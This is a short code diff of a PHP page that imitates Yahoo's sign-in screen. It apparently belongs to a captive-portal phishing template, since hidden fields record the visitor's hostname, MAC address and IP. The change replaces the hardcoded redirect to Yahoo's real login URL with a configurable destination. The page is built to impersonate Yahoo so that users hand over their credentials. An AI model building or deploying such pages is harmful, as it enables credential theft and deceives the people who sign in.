@@ -146,7 +146,7 @@ require_once('helper.php');
             <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
             <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
             <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
-            <input type="hidden" name="target" value="https://login.yahoo.com/">
+            <input type="hidden" name="target" value="<?=$destination?>">
             <button class="btn btn-primary btn-block btn-xlarge btn-sharp" name="login" type="submit">Next</button>
             <div class="text-center terms-text1"><a href="#" class="url-color">Trouble signing in?</a></div><br>
             <div class="text-center terms-text2">New to Yahoo? <a href="#" class="url-color">Sign up for a new account</a></div>
